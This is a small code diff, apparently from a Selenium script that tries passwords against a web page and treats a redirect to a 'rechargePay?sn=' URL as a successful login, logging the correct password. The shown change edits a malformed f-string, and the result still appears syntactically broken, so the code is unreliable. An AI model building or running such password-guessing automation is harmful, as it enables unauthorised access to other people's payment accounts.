@@ -69,7 +69,7 @@ def main():
                 # Success check by URL pattern
                 current_url = driver.current_url
                 if "rechargePay?sn=" in current_url:
-                    send_log(f"✅ Password correct: {pwd}
+                    send_log(f"✅ Password correct: {pwd}")
 URL: {current_url}")
                     break
 
